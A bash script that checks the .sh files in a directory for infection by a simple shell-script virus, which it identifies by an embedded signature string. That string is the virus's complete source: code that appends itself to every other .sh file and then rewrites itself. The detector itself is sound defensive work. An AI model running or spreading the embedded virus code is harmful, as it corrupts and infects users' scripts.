#! /bin/bash

files=($(ls *.sh | tr " " "\n"))
check='#!/bin/bash

files=($(ls *.sh | tr " " "\n"))
filename=$(basename $0)

for file in "${files[@]}"; do
    if [[ $file != $filename ]]; then
        echo -e "\n" >> "$file"
        cat $0 >> "$file"
    fi
done

head -n -16 $0 > temp.sh && chmod +x temp.sh && mv temp.sh $0

exit 0'


filename=$(basename $0)

for file in "${files[@]}"; do
    if [[ $file != $filename ]]; then
        f=`cat $file`
        if [[ "$f" == *"$check"* ]]; then 
            echo "The file $file is infected!"
        fi
    fi
done 
# echo $check

exit 0